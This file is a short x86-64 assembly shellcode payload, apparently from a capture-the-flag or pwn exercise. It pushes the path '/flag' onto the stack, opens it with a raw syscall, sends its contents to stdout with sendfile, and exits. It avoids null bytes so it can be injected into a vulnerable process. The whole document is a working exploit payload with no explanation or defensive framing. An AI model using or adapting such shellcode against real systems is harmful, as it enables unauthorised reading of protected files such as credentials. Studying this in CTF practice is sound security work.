.global _start
_start:
.intel_syntax noprefix
	xor rax, rax
	mov al, 2
	mov ebx, 0x67616c66
	shl rbx, 8
 	mov bl, 0x2f
	push rbx
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall

	xor rdi, rdi
	inc rdi
	mov rsi, rax
	xor rdx, rdx
	xor r10,r10
	mov r10b, 0xff
	xor rax, rax
	mov al, 0x28
	syscall

	mov al, 60
	syscall
